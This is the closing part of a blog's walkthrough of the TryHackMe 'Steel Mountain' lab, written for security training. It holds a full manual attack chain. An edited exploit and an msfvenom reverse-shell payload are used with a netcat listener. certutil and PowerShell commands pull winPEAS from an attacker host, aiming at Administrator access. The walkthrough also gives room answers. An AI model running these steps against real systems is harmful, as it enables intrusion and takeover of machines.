+<p><a href="#R-image-dbf10fb0b9ea331f3e43db2ac497b9d4" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task4_exploit.png" alt="Searchsploit" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-dbf10fb0b9ea331f3e43db2ac497b9d4"><img src="/walkthroughs/steel-mountain/task4_exploit.png" alt="Searchsploit" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Once downloaded edit the file with your favorite editor (vim, nano, etc) changing the IP and port to your local IP and a free port. I typically use 1234. <code>nano exploit.py</code></p>
+<p><a href="#R-image-dd2e654cfbb1b6a7cb75100376caed97" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task4_exploit_Edit.png" alt="Edit" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-dd2e654cfbb1b6a7cb75100376caed97"><img src="/walkthroughs/steel-mountain/task4_exploit_Edit.png" alt="Edit" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Then you will want to download the following files to the same location as your exploit.</p>
+<ul>
+<li>PowerShell PowerUp -<code> wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</code></li>
+<li>Netcat - <code>wget https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe</code></li>
+<li>WinPeas - <code>wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/a17f91745cafc5fa43a428d766294190c0ff70a1/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe</code></li>
+</ul>
+<p>Once those three files are downloaded we need to make a new msfvenom shell with the same IP and port you specified in your exploit.</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=YOUR IP LPORT=1234 -e x86/shikata_ga_nai -f exe -o Advanced.exe</code></p>
+<p><a href="#R-image-96c1d5c2a1162551668789d148474c14" class="lightbox-link"><img src="/walkthroughs/steel-mountain/task4_msfvenom.png" alt="MSFVenom 2" class="figure-image noborder lightbox noshadow" style="height: auto; width: auto;" loading="lazy"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-96c1d5c2a1162551668789d148474c14"><img src="/walkthroughs/steel-mountain/task4_msfvenom.png" alt="MSFVenom 2" class="lightbox-image noborder lightbox noshadow" loading="lazy"></a></p>
+<p>Now to set up a simple Python server on port 80.</p>
+<p><code>python3 -m http.server 80</code></p>
+<p>In a new terminal set up a netcat listener with <code>nc -nlvp 1234</code></p>
+<p>Then in yet another new terminal (this should be your third) we can start the exploit with <code>python exploit.py ATTACK IP 8080</code></p>
+<blockquote>
+<p>You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed</p>
+</blockquote>
+<p>Going back to our Netcat listener we should have a shell and can <code>cd</code> to <strong>C:\Users\bill\Desktop</strong>. Once there we can utilize <strong>certutil.exe</strong> to download WinPeas from your local machine.</p>
+<p><code>certutil.exe -urlcache -split -f http://&lt;attacker ip&gt;/winPEAS.exe</code></p>
+<p>We can also use PowerShell to do the same.</p>
+<p><code>powershell -c wget &quot;http://&lt;attacker ip&gt;:8000/winPEAS.exe&quot; -outfile &quot;winPEASx86.exe&quot;</code></p>
+<p>Next we can run winPeas with <code>winPeasx86.exe</code> and can see the same vulnerability from before when we used Metasploit.</p>
+<blockquote>
+<p>What powershell -c command could we run to manually find out the service name? <em>Format is &ldquo;powershell -c &ldquo;command here&rdquo;</em></p>
+</blockquote>
+<blockquote>
+<p>Answer: powershell -c &ldquo;Get-Service&rdquo;</p>
+</blockquote>
+<p>After this all you have to do is follow the steps in Task 3 to get root!</p>
+<blockquote>
+<p>Once this command runs, you will see you gain a shell as Administrator on our listener!</p>
+</blockquote>
+<blockquote>
+<p>Answer: No answer needed</p>
+</blockquote>
+
+            <footer class="footline">
+            </footer>
+          </article>
+        </div>
+      </main>
+    </div>
+    <aside id="R-sidebar" class="default-animation">
+      <div id="R-header-topbar" class="default-animation"></div>
+      <div id="R-header-wrapper" class="default-animation">
+        <div id="R-header" class="default-animation">
+<a href="/index.html">
+    <img src="/images/logo.png" 
+        width="200"
+        height="120"
+        alt="Website logo of hacker cat"/>
+    <h2 style="padding:0; margin:0;">H1roBytes</h2>
+</a>
+        </div>
+        <div class="searchbox default-animation">
+          <i class="fas fa-search" title="Search (CTRL+ALT+f)"></i>
+          <label class="a11y-only" for="R-search-by">Search</label>
+          <input data-search-input id="R-search-by" name="search-by" class="search-by" type="search" placeholder="Search...">
+          <button class="search-clear" type="button" data-search-clear="" title="Clear search"><i class="fas fa-times" title="Clear search"></i></button>
+        </div>
+        <script>
+          var contentLangs=['en'];
+        </script>
+        <script src="/js/auto-complete.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1738202701" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1738202701" defer></script>
+        <script src="/js/search.js?1738202701" defer></script>
+      </div>
+      <div id="R-homelinks" class="default-animation">
+        <hr class="padding">
+      </div>
+      <div id="R-content-wrapper" class="highlightable">
+        <div id="R-topics">
+          <ul class="enlarge morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/index.html" class="parent "><input type="checkbox" id="R-section-a25630664138ae6b33064dc3d9c0b30e" aria-controls="R-subsections-a25630664138ae6b33064dc3d9c0b30e" checked><label for="R-section-a25630664138ae6b33064dc3d9c0b30e"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Walkthroughs</span></label><a class="padding" href="/walkthroughs/index.html">Walkthroughs</a><ul id="R-subsections-a25630664138ae6b33064dc3d9c0b30e" class="morespace collapsible-menu">
+          <li data-nav-id="/walkthroughs/2023-advent-of-cyber/index.html" class=""><a class="padding" href="/walkthroughs/2023-advent-of-cyber/index.html">Advent of Cyber 2023! - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/cozyhosting/index.html" class=""><a class="padding" href="/walkthroughs/cozyhosting/index.html">Cozy Hosting - Hack The Box</a></li>
+          <li data-nav-id="/walkthroughs/kenobi/index.html" class=""><a class="padding" href="/walkthroughs/kenobi/index.html">Kenobi - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/nibbles/index.html" class=""><a class="padding" href="/walkthroughs/nibbles/index.html">Nibbles - HTB</a></li>
+          <li data-nav-id="/walkthroughs/red-team-engagements/index.html" class=""><a class="padding" href="/walkthroughs/red-team-engagements/index.html">Red Team Engagements - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/red-team-fundamentals/index.html" class=""><a class="padding" href="/walkthroughs/red-team-fundamentals/index.html">Red Team Fundamentals - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/rootme/index.html" class=""><a class="padding" href="/walkthroughs/rootme/index.html">RootMe - TryHackMe</a></li>
+          <li data-nav-id="/walkthroughs/steel-mountain/index.html" class="active"><a class="padding" href="/walkthroughs/steel-mountain/index.html">Steel Mountain - TryHackMe</a></li></ul></li>
+          <li data-nav-id="/resources/index.html" class=""><input type="checkbox" id="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24" aria-controls="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24"><label for="R-section-4fbbb0c8ab4cb18ef7db60d823ac6d24"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Resources</span></label><a class="padding" href="/resources/index.html">Resources</a><ul id="R-subsections-4fbbb0c8ab4cb18ef7db60d823ac6d24" class="morespace collapsible-menu">
+          <li data-nav-id="/resources/active-directory-enumeration/index.html" class=""><a class="padding" href="/resources/active-directory-enumeration/index.html">Active Directory Enumeration</a></li></ul></li>
+          <li data-nav-id="/contact/index.html" class=""><a class="padding" href="/contact/index.html">Contact</a></li>
+          </ul>
+        </div>
+        <div class="padding footermargin footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter"></div>
+        <div id="R-menu-footer">
+          <hr class="padding default-animation footerLangSwitch footerVariantSwitch footerVisitedLinks footerFooter showVariantSwitch showFooter">
+          <div id="R-prefooter" class="footerLangSwitch footerVariantSwitch footerVisitedLinks showVariantSwitch">
+            <ul>
+              <li id="R-select-language-container" class="footerLangSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-language fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-language">Language</label>
+                    <select id="R-select-language" onchange="location = baseUri + this.value;">
+                      <option id="R-en" value="/walkthroughs/steel-mountain/index.html" lang="en" selected></option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+              <li id="R-select-variant-container" class="footerVariantSwitch showVariantSwitch">
+                <div class="padding menu-control">
+                  <i class="fas fa-paint-brush fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <label class="a11y-only" for="R-select-variant">Theme</label>
+                    <select id="R-select-variant" onchange="window.variants && variants.changeVariant( this.value );">
+                      <option id="R-relearn-dark" value="relearn-dark" selected>Relearn Dark</option>
+                      <option id="R-zen-dark" value="zen-dark">Zen Dark</option>
+                      <option id="R-relearn-bright" value="relearn-bright">Relearn Bright</option>
+                      <option id="R-relearn-light" value="relearn-light">Relearn Light</option>
+                      <option id="R-zen-light" value="zen-light">Zen Light</option>
+                      <option id="R-neon" value="neon">Neon</option>
+                      <option id="R-learn" value="learn">Learn</option>
+                      <option id="R-blue" value="blue">Blue</option>
+                      <option id="R-green" value="green">Green</option>
+                      <option id="R-red" value="red">Red</option>
+                    </select>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+                <script>window.variants && variants.markSelectedVariant();</script>
+              </li>
+              <li class="footerVisitedLinks">
+                <div class="padding menu-control">
+                  <i class="fas fa-history fa-fw"></i>
+                  <span>&nbsp;</span>
+                  <div class="control-style">
+                    <button onclick="clearHistory();">Clear History</button>
+                  </div>
+                  <div class="clear"></div>
+                </div>
+              </li>
+            </ul>
+          </div>
+          <div id="R-footer" class="footerFooter showFooter">
+	    <p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p>
+		<p><a href="https://hirobytes.xyz/disclaimer">Disclaimer</a></p>
+          </div>
+        </div>
+      </div>
+    </aside>
+    <script src="/js/clipboard.min.js?1738202701" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1738202701" defer></script>
+    <script>
+      function useMathJax( config ){
+        if( !Object.assign ){
+          
+          return;
+        }
+        window.MathJax = Object.assign( window.MathJax || {}, {
+          loader: {
+            load: ['[tex]/mhchem']
+          },
+          startup: {
+            elements: [
+              '.math'
+            ]
+          },
+          tex: {
+            inlineMath: [
+              ['$', '$'], 
+              ['\\(', '\\)']
+            ]
+          },
+          options: {
+            enableMenu: false 
+          }
+        }, config );
+      }
+      useMathJax( JSON.parse( null ) );
+    </script>
+    <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    <script src="/js/d3/d3-color.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1738202701" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1738202701" defer></script>
+    <script src="/js/js-yaml.min.js?1738202701" defer></script>
+    <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
+    <script>
+      window.themeUseMermaid = JSON.parse( null );
+    </script>
+    <script>window.noZensmooth = true;</script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
+    <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
+    <script>
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1738202701  };
+    </script>
+    <script src="/js/theme.js?1738202701" defer></script>
+  </body>
+</html>
